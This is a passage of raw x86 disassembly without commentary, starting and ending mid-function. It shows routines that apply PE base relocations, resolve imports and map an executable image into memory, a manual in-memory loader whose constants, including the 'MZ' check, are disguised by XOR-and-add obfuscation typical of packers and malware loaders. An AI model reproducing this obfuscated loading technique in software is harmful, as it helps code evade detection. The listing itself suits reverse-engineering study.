  41e6cb:	movzx  ebx,WORD PTR [edx+0xc]
  41e6cf:	add    edi,ebx
  41e6d1:	je     0x41e73c
  41e6d3:	lea    ecx,[edx+0x14]
  41e6d6:	mov    DWORD PTR [ebp-0x14],ecx
  41e6d9:	test   DWORD PTR [ecx],esi
  41e6db:	je     0x41e71e
  41e6dd:	mov    ecx,DWORD PTR [ecx]
  41e6df:	and    DWORD PTR [ebp-0x8],0x0
  41e6e3:	and    ecx,esi
  41e6e5:	add    ecx,eax
  41e6e7:	movzx  edi,WORD PTR [ecx+0xe]
  41e6eb:	movzx  ebx,WORD PTR [ecx+0xc]
  41e6ef:	add    edi,ebx
  41e6f1:	je     0x41e71e
  41e6f3:	lea    edi,[ecx+0x14]
  41e6f6:	mov    DWORD PTR [ebp-0x4],edi
  41e6f9:	mov    edi,DWORD PTR [ebp-0x4]
  41e6fc:	mov    edi,DWORD PTR [edi]
  41e6fe:	test   edi,edi
  41e700:	je     0x41e708
  41e702:	mov    ebx,DWORD PTR [ebp-0x1c]
  41e705:	add    DWORD PTR [edi+eax*1],ebx
  41e708:	movzx  edi,WORD PTR [ecx+0xe]
  41e70c:	movzx  ebx,WORD PTR [ecx+0xc]
  41e710:	inc    DWORD PTR [ebp-0x8]
  41e713:	add    DWORD PTR [ebp-0x4],0x8
  41e717:	add    edi,ebx
  41e719:	cmp    DWORD PTR [ebp-0x8],edi
  41e71c:	jb     0x41e6f9
  41e71e:	movzx  edi,WORD PTR [edx+0xe]
  41e722:	movzx  ebx,WORD PTR [edx+0xc]
  41e726:	mov    ecx,DWORD PTR [ebp-0x14]
  41e729:	inc    DWORD PTR [ebp-0xc]
  41e72c:	add    ecx,0x8
  41e72f:	add    edi,ebx
  41e731:	mov    DWORD PTR [ebp-0x14],ecx
  41e734:	cmp    DWORD PTR [ebp-0xc],edi
  41e737:	jb     0x41e6d9
  41e739:	mov    ecx,DWORD PTR [ebp-0x18]
  41e73c:	movzx  edx,WORD PTR [eax+0xe]
  41e740:	movzx  edi,WORD PTR [eax+0xc]
  41e744:	inc    DWORD PTR [ebp-0x10]
  41e747:	add    ecx,0x8
  41e74a:	add    edx,edi
  41e74c:	mov    DWORD PTR [ebp-0x18],ecx
  41e74f:	cmp    DWORD PTR [ebp-0x10],edx
  41e752:	jb     0x41e6b9
  41e758:	pop    edi
  41e759:	pop    ebx
  41e75a:	xor    eax,eax
  41e75c:	inc    eax
  41e75d:	jmp    0x41e761
  41e75f:	xor    eax,eax
  41e761:	pop    esi
  41e762:	leave  
  41e763:	ret    
  41e764:	push   ebp
  41e765:	mov    ebp,esp
  41e767:	mov    ecx,DWORD PTR [ecx+0x190]
  41e76d:	mov    eax,DWORD PTR [ebp+0xc]
  41e770:	sub    esp,0x10
  41e773:	push   ebx
  41e774:	xor    ebx,ebx
  41e776:	push   esi
  41e777:	push   edi
  41e778:	cmp    DWORD PTR [ecx],ebx
  41e77a:	je     0x41e802
  41e780:	cmp    eax,ebx
  41e782:	je     0x41e802
  41e784:	cmp    DWORD PTR [eax+0x78],ebx
  41e787:	jne    0x41e78e
  41e789:	xor    eax,eax
  41e78b:	inc    eax
  41e78c:	jmp    0x41e804
  41e78e:	mov    eax,DWORD PTR [eax+0x78]
  41e791:	add    eax,DWORD PTR [ebp+0x8]
  41e794:	mov    ecx,DWORD PTR [eax+0x1c]
  41e797:	mov    edx,DWORD PTR [eax+0x24]
  41e79a:	mov    esi,DWORD PTR [eax+0x14]
  41e79d:	mov    edi,DWORD PTR [eax+0x18]
  41e7a0:	add    ecx,DWORD PTR [ebp+0x8]
  41e7a3:	add    edx,DWORD PTR [ebp+0x8]
  41e7a6:	mov    DWORD PTR [ebp-0x4],esi
  41e7a9:	cmp    esi,edi
  41e7ab:	ja     0x41e7b0
  41e7ad:	mov    DWORD PTR [ebp-0x4],edi
  41e7b0:	mov    DWORD PTR [ebp-0x8],ebx
  41e7b3:	cmp    DWORD PTR [ebp-0x4],ebx
  41e7b6:	jbe    0x41e789
  41e7b8:	cmp    ebx,DWORD PTR [eax+0x14]
  41e7bb:	jae    0x41e7c3
  41e7bd:	movzx  esi,WORD PTR [edx+ebx*2]
  41e7c1:	jmp    0x41e7c5
  41e7c3:	mov    esi,ebx
  41e7c5:	lea    esi,[ecx+esi*4]
  41e7c8:	mov    edi,DWORD PTR [esi]
  41e7ca:	test   edi,edi
  41e7cc:	je     0x41e7f7
  41e7ce:	add    edi,DWORD PTR [ebp+0x8]
  41e7d1:	mov    DWORD PTR [ebp-0x10],edi
  41e7d4:	cmp    edi,eax
  41e7d6:	jbe    0x41e7e8
  41e7d8:	mov    ebx,DWORD PTR [ebp+0xc]
  41e7db:	mov    ebx,DWORD PTR [ebx+0x7c]
  41e7de:	add    ebx,eax
  41e7e0:	cmp    edi,ebx
  41e7e2:	jae    0x41e7e8
  41e7e4:	mov    esi,DWORD PTR [esi]
  41e7e6:	jmp    0x41e7f0
  41e7e8:	sub    edi,DWORD PTR [ebp+0x8]
  41e7eb:	mov    DWORD PTR [esi],edi
  41e7ed:	mov    esi,DWORD PTR [ebp-0x10]
  41e7f0:	test   esi,esi
  41e7f2:	je     0x41e802
  41e7f4:	mov    ebx,DWORD PTR [ebp-0x8]
  41e7f7:	inc    ebx
  41e7f8:	mov    DWORD PTR [ebp-0x8],ebx
  41e7fb:	cmp    ebx,DWORD PTR [ebp-0x4]
  41e7fe:	jb     0x41e7b8
  41e800:	jmp    0x41e789
  41e802:	xor    eax,eax
  41e804:	pop    edi
  41e805:	pop    esi
  41e806:	pop    ebx
  41e807:	leave  
  41e808:	ret    0x8
  41e80b:	push   ebp
  41e80c:	mov    ebp,esp
  41e80e:	sub    esp,0x2c
  41e811:	mov    edx,0xf89c8585
  41e816:	mov    DWORD PTR [ebp-0x4],edx
  41e819:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41e820:	mov    eax,DWORD PTR [ebp-0x4]
  41e823:	mov    ecx,DWORD PTR [ebp-0x4]
  41e826:	mov    ecx,DWORD PTR [ebp-0x4]
  41e829:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82c:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82f:	mov    ecx,DWORD PTR [ebp-0x4]
  41e832:	push   ebx
  41e833:	mov    ebx,DWORD PTR [ebp+0x10]
  41e836:	push   esi
  41e837:	mov    esi,0x751089b
  41e83c:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41e843:	mov    ecx,DWORD PTR [ebp-0x4]
  41e846:	mov    ebx,DWORD PTR [ebx+0x190]
  41e84c:	push   edi
  41e84d:	mov    edi,0x3272e2
  41e852:	xor    ecx,esi
  41e854:	xor    eax,esi
  41e856:	add    eax,edi
  41e858:	add    ecx,edi
  41e85a:	mov    DWORD PTR [ebp-0x18],eax
  41e85d:	cmp    ecx,DWORD PTR [ebx]
  41e85f:	je     0x41eae0
  41e865:	mov    ebx,DWORD PTR [ebp-0x4]
  41e868:	mov    ecx,DWORD PTR [ebp+0xc]
  41e86b:	xor    ebx,esi
  41e86d:	add    ebx,edi
  41e86f:	cmp    ebx,ecx
  41e871:	je     0x41eae0
  41e877:	mov    ebx,DWORD PTR [ebp-0x4]
  41e87a:	mov    ecx,DWORD PTR [ecx+0x80]
  41e880:	xor    ebx,esi
  41e882:	add    ebx,edi
  41e884:	cmp    ecx,ebx
  41e886:	je     0x41eadb
  41e88c:	add    ecx,DWORD PTR [ebp+0x8]
  41e88f:	mov    DWORD PTR [ebp-0x2c],ecx
  41e892:	mov    ebx,edx
  41e894:	xor    ebx,esi
  41e896:	add    ebx,edi
  41e898:	mov    DWORD PTR [ebp-0x10],ebx
  41e89b:	mov    ebx,DWORD PTR [ebp-0x10]
  41e89e:	cmp    ebx,edx
  41e8a0:	je     0x41e8b4
  41e8a2:	mov    edx,DWORD PTR [ebp-0x10]
  41e8a5:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8a8:	imul   edx,edx,0x14
  41e8ab:	xor    ebx,esi
  41e8ad:	add    ebx,edi
  41e8af:	cmp    DWORD PTR [edx+ecx*1],ebx
  41e8b2:	jne    0x41e8cb
  41e8b4:	mov    edx,DWORD PTR [ebp-0x10]
  41e8b7:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8ba:	imul   edx,edx,0x14
  41e8bd:	xor    ebx,esi
  41e8bf:	add    ebx,edi
  41e8c1:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41e8c5:	je     0x41eacd
  41e8cb:	mov    eax,DWORD PTR [ebp-0x4]
  41e8ce:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8d1:	mov    eax,DWORD PTR [ebp-0x10]
  41e8d4:	imul   eax,eax,0x14
  41e8d7:	add    eax,ecx
  41e8d9:	mov    ecx,DWORD PTR [eax+0x10]
  41e8dc:	add    ecx,DWORD PTR [ebp+0x8]
  41e8df:	xor    ebx,esi
  41e8e1:	mov    DWORD PTR [ebp-0x1c],ecx
  41e8e4:	mov    ecx,DWORD PTR [ebp-0x4]
  41e8e7:	mov    edx,DWORD PTR [ebp-0x4]
  41e8ea:	xor    ecx,esi
  41e8ec:	add    ecx,edi
  41e8ee:	xor    edx,esi
  41e8f0:	mov    DWORD PTR [ebp-0x24],ecx
  41e8f3:	mov    ecx,DWORD PTR [eax]
  41e8f5:	add    edx,edi
  41e8f7:	add    ebx,edi
  41e8f9:	cmp    ecx,edx
  41e8fb:	je     0x41e903
  41e8fd:	add    ecx,DWORD PTR [ebp+0x8]
  41e900:	mov    DWORD PTR [ebp-0x24],ecx
  41e903:	mov    ecx,DWORD PTR [ebp-0x4]
  41e906:	xor    ecx,esi
  41e908:	add    ecx,DWORD PTR [eax+0xc]
  41e90b:	mov    eax,DWORD PTR [ebp+0x8]
  41e90e:	lea    eax,[ecx+eax*1+0x3272e2]
  41e915:	mov    DWORD PTR [ebp+0xc],eax
  41e918:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41e91f:	mov    eax,DWORD PTR [ebp+0x10]
  41e922:	push   DWORD PTR [ebp+0xc]
  41e925:	mov    eax,DWORD PTR [eax+0x1d8]
  41e92b:	call   DWORD PTR [eax]
  41e92d:	mov    ecx,DWORD PTR [ebp-0x4]
  41e930:	xor    ecx,esi
  41e932:	add    ecx,edi
  41e934:	mov    DWORD PTR [ebp-0xc],eax
  41e937:	cmp    ecx,eax
  41e939:	jne    0x41e94d
  41e93b:	mov    eax,DWORD PTR [ebp+0x10]
  41e93e:	push   DWORD PTR [ebp+0xc]
  41e941:	mov    eax,DWORD PTR [eax+0x1d8]
  41e947:	call   DWORD PTR [eax+0xc]
  41e94a:	mov    DWORD PTR [ebp-0xc],eax
  41e94d:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  41e954:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  41e95b:	mov    eax,DWORD PTR [ebp-0x4]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    eax,DWORD PTR [ebp-0xc]
  41e965:	jne    0x41e98a
  41e967:	mov    eax,DWORD PTR [ebp-0x8]
  41e96a:	mov    ecx,DWORD PTR [ebp-0x20]
  41e96d:	xor    eax,esi
  41e96f:	xor    ecx,esi
  41e971:	lea    ebx,[ebx+eax*1+0x3272e2]
  41e978:	mov    eax,DWORD PTR [ebp+0x10]
  41e97b:	mov    eax,DWORD PTR [eax+0x1d8]
  41e981:	add    ecx,edi
  41e983:	imul   ecx,ebx
  41e986:	push   ecx
  41e987:	call   DWORD PTR [eax+0x24]
  41e98a:	mov    eax,DWORD PTR [ebp-0x4]
  41e98d:	xor    eax,esi
  41e98f:	add    eax,edi
  41e991:	cmp    eax,DWORD PTR [ebp-0xc]
  41e994:	jne    0x41e9a5
  41e996:	mov    eax,DWORD PTR [ebp-0x28]
  41e999:	xor    eax,esi
  41e99b:	add    eax,edi
  41e99d:	cmp    ebx,eax
  41e99f:	jbe    0x41e91f
  41e9a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e9a8:	xor    eax,esi
  41e9aa:	add    eax,edi
  41e9ac:	cmp    eax,DWORD PTR [ebp-0xc]
  41e9af:	jne    0x41e9c8
  41e9b1:	mov    eax,DWORD PTR [ebp-0x8]
  41e9b4:	mov    ecx,DWORD PTR [ebp-0x18]
  41e9b7:	xor    eax,esi
  41e9b9:	lea    eax,[ecx+eax*1+0x3272e2]
  41e9c0:	mov    DWORD PTR [ebp-0x18],eax
  41e9c3:	jmp    0x41eab7
  41e9c8:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  41e9cf:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41e9d6:	mov    ebx,DWORD PTR [ebp-0x4]
  41e9d9:	xor    ebx,esi
  41e9db:	add    ebx,edi
  41e9dd:	jmp    0x41eaa4
  41e9e2:	mov    eax,DWORD PTR [ebp-0x4]
  41e9e5:	xor    eax,esi
  41e9e7:	add    eax,edi
  41e9e9:	mov    DWORD PTR [ebp-0x14],eax
  41e9ec:	mov    eax,DWORD PTR [ebp-0x4]
  41e9ef:	xor    eax,esi
  41e9f1:	add    eax,edi
  41e9f3:	mov    DWORD PTR [ebp+0xc],eax
  41e9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41e9f9:	mov    eax,DWORD PTR [ebp-0x24]
  41e9fc:	xor    ecx,esi
  41e9fe:	add    ecx,edi
  41ea00:	cmp    ecx,eax
  41ea02:	je     0x41ea0a
  41ea04:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea07:	mov    DWORD PTR [ebp-0x14],eax
  41ea0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ea0d:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea10:	mov    DWORD PTR [ebp+0xc],eax
  41ea13:	mov    eax,DWORD PTR [ebp-0x4]
  41ea16:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea19:	xor    eax,esi
  41ea1b:	add    eax,edi
  41ea1d:	cmp    eax,ecx
  41ea1f:	je     0x41ea4a
  41ea21:	mov    eax,DWORD PTR [ebp-0x4]
  41ea24:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea27:	xor    eax,esi
  41ea29:	add    eax,edi
  41ea2b:	shr    ecx,0x1f
  41ea2e:	cmp    eax,ecx
  41ea30:	je     0x41ea4a
  41ea32:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea35:	mov    eax,DWORD PTR [ebp+0x10]
  41ea38:	mov    eax,DWORD PTR [eax+0x1d8]
  41ea3e:	movzx  ecx,cx
  41ea41:	push   ecx
  41ea42:	push   DWORD PTR [ebp-0xc]
  41ea45:	call   DWORD PTR [eax+0x8]
  41ea48:	jmp    0x41ea63
  41ea4a:	mov    eax,DWORD PTR [ebp+0xc]
  41ea4d:	add    eax,DWORD PTR [ebp+0x8]
  41ea50:	mov    ecx,DWORD PTR [ebp+0x10]
  41ea53:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ea59:	add    eax,0x2
  41ea5c:	push   eax
  41ea5d:	push   DWORD PTR [ebp-0xc]
  41ea60:	call   DWORD PTR [ecx+0x8]
  41ea63:	mov    DWORD PTR [ebp+0xc],eax
  41ea66:	mov    eax,DWORD PTR [ebp-0x4]
  41ea69:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea6c:	xor    eax,esi
  41ea6e:	add    eax,edi
  41ea70:	cmp    eax,ecx
  41ea72:	mov    eax,DWORD PTR [ebp-0x8]
  41ea75:	jne    0x41ea88
  41ea77:	mov    ecx,DWORD PTR [ebp-0x18]
  41ea7a:	xor    eax,esi
  41ea7c:	lea    eax,[ecx+eax*1+0x3272e2]
  41ea83:	mov    DWORD PTR [ebp-0x18],eax
  41ea86:	jmp    0x41ea98
  41ea88:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea8b:	xor    eax,esi
  41ea8d:	add    eax,edi
  41ea8f:	imul   eax,ecx
  41ea92:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ea95:	mov    DWORD PTR [ecx+ebx*4],eax
  41ea98:	mov    eax,DWORD PTR [ebp-0x8]
  41ea9b:	xor    eax,esi
  41ea9d:	lea    ebx,[ebx+eax*1+0x3272e2]
  41eaa4:	mov    eax,DWORD PTR [ebp-0x4]
  41eaa7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41eaaa:	xor    eax,esi
  41eaac:	add    eax,edi
  41eaae:	cmp    DWORD PTR [ecx+ebx*4],eax
  41eab1:	jne    0x41e9e2
  41eab7:	mov    edx,DWORD PTR [ebp-0x10]
  41eaba:	mov    eax,DWORD PTR [ebp-0x18]
  41eabd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41eac0:	sub    edx,0x3272e1
  41eac6:	xor    edx,esi
  41eac8:	jmp    0x41e892
  41eacd:	mov    ecx,DWORD PTR [ebp-0x4]
  41ead0:	xor    ecx,esi
  41ead2:	add    ecx,edi
  41ead4:	cmp    eax,ecx
  41ead6:	mov    eax,DWORD PTR [ebp-0x4]
  41ead9:	jne    0x41eae3
  41eadb:	mov    eax,DWORD PTR [ebp-0x8]
  41eade:	jmp    0x41eae3
  41eae0:	mov    eax,DWORD PTR [ebp-0x4]
  41eae3:	xor    eax,esi
  41eae5:	add    eax,edi
  41eae7:	pop    edi
  41eae8:	pop    esi
  41eae9:	pop    ebx
  41eaea:	leave  
  41eaeb:	ret    0xc
  41eaee:	push   ebp
  41eaef:	mov    ebp,esp
  41eaf1:	sub    esp,0x28
  41eaf4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41eafb:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  41eb02:	mov    eax,DWORD PTR [ebp+0xc]
  41eb05:	mov    DWORD PTR [ebp+0xc],eax
  41eb08:	push   esi
  41eb09:	mov    eax,eax
  41eb0b:	mov    eax,DWORD PTR [ebp-0x4]
  41eb0e:	mov    esi,DWORD PTR [ebp+0x8]
  41eb11:	mov    ecx,0x751089b
  41eb16:	xor    eax,ecx
  41eb18:	mov    edx,0x3272e2
  41eb1d:	add    eax,edx
  41eb1f:	cmp    esi,eax
  41eb21:	je     0x41ec48
  41eb27:	mov    eax,DWORD PTR [ebp+0x8]
  41eb2a:	mov    esi,DWORD PTR [ebp+0x8]
  41eb2d:	add    esi,DWORD PTR [eax+0x3c]
  41eb30:	push   edi
  41eb31:	mov    DWORD PTR [ebp+0xc],esi
  41eb34:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  41eb3b:	mov    eax,DWORD PTR [ebp-0x1c]
  41eb3e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb41:	mov    edi,DWORD PTR [ebp+0xc]
  41eb44:	xor    esi,ecx
  41eb46:	xor    eax,ecx
  41eb48:	add    esi,edx
  41eb4a:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  41eb51:	je     0x41ec42
  41eb57:	mov    esi,DWORD PTR [ebp+0xc]
  41eb5a:	mov    eax,DWORD PTR [ebp+0x8]
  41eb5d:	add    eax,DWORD PTR [esi+0xa0]
  41eb63:	mov    esi,DWORD PTR [ebp+0x8]
  41eb66:	mov    edi,DWORD PTR [ebp+0xc]
  41eb69:	sub    esi,DWORD PTR [edi+0x34]
  41eb6c:	mov    edi,DWORD PTR [ebp-0x4]
  41eb6f:	xor    edi,ecx
  41eb71:	add    edi,edx
  41eb73:	mov    DWORD PTR [ebp-0x24],esi
  41eb76:	cmp    esi,edi
  41eb78:	je     0x41ec42
  41eb7e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb81:	xor    esi,ecx
  41eb83:	add    esi,edx
  41eb85:	mov    DWORD PTR [ebp-0x8],esi
  41eb88:	push   ebx
  41eb89:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41eb90:	jmp    0x41ec2c
  41eb95:	mov    esi,DWORD PTR [ebp-0x4]
  41eb98:	xor    esi,ecx
  41eb9a:	lea    edi,[ebx-0x8]
  41eb9d:	add    esi,edx
  41eb9f:	shr    edi,1
  41eba1:	cmp    esi,edi
  41eba3:	jae    0x41ec12
  41eba5:	sub    edi,esi
  41eba7:	lea    ebx,[eax+esi*2+0x8]
  41ebab:	mov    DWORD PTR [ebp-0x18],edi
  41ebae:	movzx  esi,WORD PTR [ebx]
  41ebb1:	and    esi,0xfff
  41ebb7:	mov    DWORD PTR [ebp-0x14],esi
  41ebba:	mov    edi,DWORD PTR [ebp-0x14]
  41ebbd:	mov    esi,DWORD PTR [eax]
  41ebbf:	sub    esi,edx
  41ebc1:	add    edi,esi
  41ebc3:	movzx  esi,WORD PTR [ebx]
  41ebc6:	shr    esi,0xc
  41ebc9:	xor    edi,ecx
  41ebcb:	mov    DWORD PTR [ebp-0x20],edi
  41ebce:	mov    DWORD PTR [ebp-0x14],esi
  41ebd1:	mov    esi,DWORD PTR [ebp-0x20]
  41ebd4:	mov    edi,DWORD PTR [ebp+0x8]
  41ebd7:	xor    esi,ecx
  41ebd9:	lea    esi,[esi+edi*1+0x3272e2]
  41ebe0:	mov    DWORD PTR [ebp-0x20],esi
  41ebe3:	mov    esi,DWORD PTR [ebp-0x10]
  41ebe6:	mov    edi,DWORD PTR [ebp-0x14]
  41ebe9:	xor    esi,ecx
  41ebeb:	add    esi,edx
  41ebed:	cmp    edi,esi
  41ebef:	jne    0x41ec07
  41ebf1:	mov    esi,DWORD PTR [ebp-0x10]
  41ebf4:	mov    edi,DWORD PTR [ebp-0x14]
  41ebf7:	xor    esi,ecx
  41ebf9:	add    esi,edx
  41ebfb:	cmp    edi,esi
  41ebfd:	jne    0x41ec07
  41ebff:	mov    esi,DWORD PTR [ebp-0x20]
  41ec02:	mov    edi,DWORD PTR [ebp-0x24]
  41ec05:	add    DWORD PTR [esi],edi
  41ec07:	add    ebx,0x2
  41ec0a:	dec    DWORD PTR [ebp-0x18]
  41ec0d:	jne    0x41ebae
  41ec0f:	mov    ebx,DWORD PTR [ebp-0xc]
  41ec12:	add    DWORD PTR [ebp-0x8],ebx
  41ec15:	mov    esi,DWORD PTR [ebp-0x1c]
  41ec18:	mov    edi,DWORD PTR [ebp-0x8]
  41ec1b:	mov    ebx,DWORD PTR [ebp+0xc]
  41ec1e:	xor    esi,ecx
  41ec20:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41ec27:	jae    0x41ec41
  41ec29:	add    eax,DWORD PTR [ebp-0xc]
  41ec2c:	mov    esi,DWORD PTR [ebp-0x4]
  41ec2f:	mov    ebx,DWORD PTR [eax+0x4]
  41ec32:	xor    esi,ecx
  41ec34:	add    esi,edx
  41ec36:	mov    DWORD PTR [ebp-0xc],ebx
  41ec39:	cmp    ebx,esi
  41ec3b:	jne    0x41eb95
  41ec41:	pop    ebx
  41ec42:	mov    eax,DWORD PTR [ebp-0x28]
  41ec45:	pop    edi
  41ec46:	jmp    0x41ec4b
  41ec48:	mov    eax,DWORD PTR [ebp-0x4]
  41ec4b:	xor    eax,ecx
  41ec4d:	add    eax,edx
  41ec4f:	pop    esi
  41ec50:	leave  
  41ec51:	ret    0x8
  41ec54:	push   ebp
  41ec55:	mov    ebp,esp
  41ec57:	sub    esp,0xcc
  41ec5d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41ec64:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  41ec6b:	mov    eax,DWORD PTR [ebp-0x4]
  41ec6e:	push   ebx
  41ec6f:	push   esi
  41ec70:	mov    esi,0x751089b
  41ec75:	xor    eax,esi
  41ec77:	push   edi
  41ec78:	mov    edi,0x3272e2
  41ec7d:	add    eax,edi
  41ec7f:	mov    DWORD PTR [ebp-0x1c],eax
  41ec82:	mov    eax,DWORD PTR [ebp-0x4]
  41ec85:	xor    eax,esi
  41ec87:	add    eax,edi
  41ec89:	mov    DWORD PTR [ebp-0x8],eax
  41ec8c:	mov    ebx,DWORD PTR [ebp+0x20]
  41ec8f:	mov    eax,DWORD PTR [ebp-0x14]
  41ec92:	mov    ecx,DWORD PTR [ebp-0x14]
  41ec95:	xor    eax,ecx
  41ec97:	mov    DWORD PTR [ebp-0x14],eax
  41ec9a:	add    DWORD PTR [ebp-0x14],0xf89cb585
  41eca1:	mov    eax,DWORD PTR [ebp-0xc]
  41eca4:	mov    ecx,DWORD PTR [ebp-0xc]
  41eca7:	xor    eax,ecx
  41eca9:	mov    DWORD PTR [ebp-0xc],eax
  41ecac:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41ecb3:	mov    eax,DWORD PTR [ebp-0x10]
  41ecb6:	mov    ecx,DWORD PTR [ebp-0x10]
  41ecb9:	xor    eax,ecx
  41ecbb:	mov    DWORD PTR [ebp-0x10],eax
  41ecbe:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41ecc5:	mov    eax,DWORD PTR [ebp-0x20]
  41ecc8:	mov    ecx,DWORD PTR [ebp-0x20]
  41eccb:	xor    eax,ecx
  41eccd:	mov    DWORD PTR [ebp-0x20],eax
  41ecd0:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41ecd7:	mov    eax,0x9471
  41ecdc:	mov    WORD PTR [ebp+0x20],ax
  41ece0:	mov    eax,DWORD PTR [ebp+0x8]
  41ece3:	test   eax,eax
  41ece5:	je     0x41f140
  41eceb:	mov    eax,DWORD PTR [ebp+0xc]
  41ecee:	test   eax,eax
  41ecf0:	je     0x41f140
  41ecf6:	mov    eax,DWORD PTR [ebp+0x18]
  41ecf9:	test   eax,eax
  41ecfb:	je     0x41f140
  41ed01:	mov    ax,WORD PTR [ebp+0x20]
  41ed05:	mov    ecx,0x8a8d
  41ed0a:	xor    ax,cx
  41ed0d:	mov    ecx,0x3b51
  41ed12:	add    ax,cx
  41ed15:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed18:	cmp    WORD PTR [ecx],ax
  41ed1b:	jne    0x41f140
  41ed21:	mov    eax,DWORD PTR [ebp-0x4]
  41ed24:	xor    eax,esi
  41ed26:	add    eax,edi
  41ed28:	mov    DWORD PTR [ebp-0x30],eax
  41ed2b:	mov    eax,DWORD PTR [ebp-0x4]
  41ed2e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed31:	mov    eax,DWORD PTR [ebp+0x8]
  41ed34:	add    eax,DWORD PTR [ecx+0x3c]
  41ed37:	mov    DWORD PTR [ebp+0xc],eax
  41ed3a:	mov    eax,DWORD PTR [eax+0x50]
  41ed3d:	test   eax,eax
  41ed3f:	je     0x41f140
  41ed45:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  41ed4c:	mov    eax,DWORD PTR [ebp-0x2c]
  41ed4f:	xor    eax,esi
  41ed51:	add    eax,edi
  41ed53:	mov    DWORD PTR [ebp-0x2c],eax
  41ed56:	mov    eax,DWORD PTR [ebp-0x4]
  41ed59:	mov    eax,DWORD PTR [ebx+0x190]
  41ed5f:	mov    ecx,DWORD PTR [eax]
  41ed61:	mov    ecx,DWORD PTR [ecx+0x3c]
  41ed64:	add    ecx,DWORD PTR [eax]
  41ed66:	mov    eax,DWORD PTR [ebp-0x4]
  41ed69:	mov    eax,DWORD PTR [ebx+0x18c]
  41ed6f:	mov    edx,DWORD PTR [eax]
  41ed71:	mov    DWORD PTR [ebp-0x18],ecx
  41ed74:	mov    DWORD PTR [ebp+0x20],edx
  41ed77:	cmp    edx,edx
  41ed79:	jne    0x41edad
  41ed7b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ed81:	lea    edx,[ebp-0x1c]
  41ed84:	push   edx
  41ed85:	mov    edx,DWORD PTR [ebp-0xc]
  41ed88:	xor    edx,esi
  41ed8a:	add    edx,edi
  41ed8c:	push   edx
  41ed8d:	push   DWORD PTR [ecx+0x50]
  41ed90:	push   DWORD PTR [ebp+0x20]
  41ed93:	call   DWORD PTR [eax+0x1c]
  41ed96:	mov    eax,DWORD PTR [ebp-0x18]
  41ed99:	mov    ecx,DWORD PTR [eax+0x54]
  41ed9c:	mov    eax,DWORD PTR [eax+0x50]
  41ed9f:	sub    eax,ecx
  41eda1:	add    ecx,DWORD PTR [ebp+0x20]
  41eda4:	push   ecx
  41eda5:	call   0x41f72c
  41edaa:	mov    edx,DWORD PTR [ebp+0x20]
  41edad:	mov    eax,DWORD PTR [ebx+0x194]
  41edb3:	mov    DWORD PTR [eax],edx
  41edb5:	mov    eax,DWORD PTR [ebp+0xc]
  41edb8:	push   DWORD PTR [eax+0x54]
  41edbb:	push   DWORD PTR [ebp+0x8]
  41edbe:	push   edx
  41edbf:	call   0x41f5d3
  41edc4:	mov    ecx,DWORD PTR [ebp+0x20]
  41edc7:	mov    eax,DWORD PTR [ecx+0x3c]
  41edca:	add    eax,ecx
  41edcc:	movzx  ecx,WORD PTR [eax+0x14]
  41edd0:	lea    ecx,[ecx+eax*1+0x18]
  41edd4:	mov    DWORD PTR [ebp+0x18],ecx
  41edd7:	mov    ecx,DWORD PTR [ebp-0x4]
  41edda:	movzx  edx,WORD PTR [eax+0x6]
  41edde:	xor    ecx,esi
  41ede0:	add    ecx,edi
  41ede2:	mov    DWORD PTR [ebp+0xc],eax
  41ede5:	cmp    edx,ecx
  41ede7:	je     0x41ee94
  41eded:	mov    ecx,DWORD PTR [ebp-0x4]
  41edf0:	xor    ecx,esi
  41edf2:	add    ecx,edi
  41edf4:	mov    DWORD PTR [ebp-0x8],ecx
  41edf7:	mov    ecx,DWORD PTR [ebp-0x24]
  41edfa:	movzx  edx,WORD PTR [eax+0x6]
  41edfe:	xor    ecx,esi
  41ee00:	sub    edx,ecx
  41ee02:	sub    edx,edi
  41ee04:	cmp    DWORD PTR [ebp-0x8],edx
  41ee07:	ja     0x41ee94
  41ee0d:	mov    edx,DWORD PTR [ebp+0x18]
  41ee10:	add    edx,0x8
  41ee13:	mov    DWORD PTR [ebp+0x18],edx
  41ee16:	jmp    0x41ee1b
  41ee18:	mov    edx,DWORD PTR [ebp+0x18]
